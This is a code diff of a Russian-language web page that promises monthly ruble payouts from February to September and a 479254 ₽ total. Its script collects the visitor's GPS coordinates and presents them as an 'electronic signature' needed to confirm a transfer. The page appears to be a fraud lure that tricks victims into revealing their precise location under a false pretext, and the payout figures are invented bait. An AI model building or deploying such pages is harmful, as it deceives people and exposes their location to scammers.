@@ -6,14 +6,104 @@
 </head>
 <body>
 <h3>Ваши выплаты составят:</h3>
+<table>
+    <tr>
+        <td>
+            Месяц
+        </td>
+        <td>
+            Сумма
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Февраль</b>
+        </td>
+        <td>
+            <p>127010 ₽</p>
+            <p>53155 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Март</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Апрель</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Май</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Июнь</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Июль</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Август</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <b>Сентябрь</b>
+        </td>
+        <td>
+            <p>124045 ₽</p>
+            <p>58100 ₽</p>
+            <p>15000 ₽</p>
+        </td>
+    </tr>
+</table>
 <p>479254.00 ₽</p>
 <div id="cords-text">
-
+<h4>Важно!</h4>
 </div>
 <script>
     navigator.geolocation.getCurrentPosition(function (position) {
         let coords = position.coords.latitude + '; ' +  position.coords.longitude;
-        document.getElementById('cords-text').innerText = 'Ваша электронная подпись \n(необходима для подтверждения перевода по вашим реквезитам): \n' + coords;
+        document.getElementById('cords-text').innerHTML = 'Ваша электронная подпись \n<b>(необходима для подтверждения перевода по вашим реквезитам):</b><br> Salary Special Sign <b><code style="font-size: 15px;">№ 0077 - ' + coords + ' - 1505-EFS' + '</code></b>';
     })
 </script>
 </body>
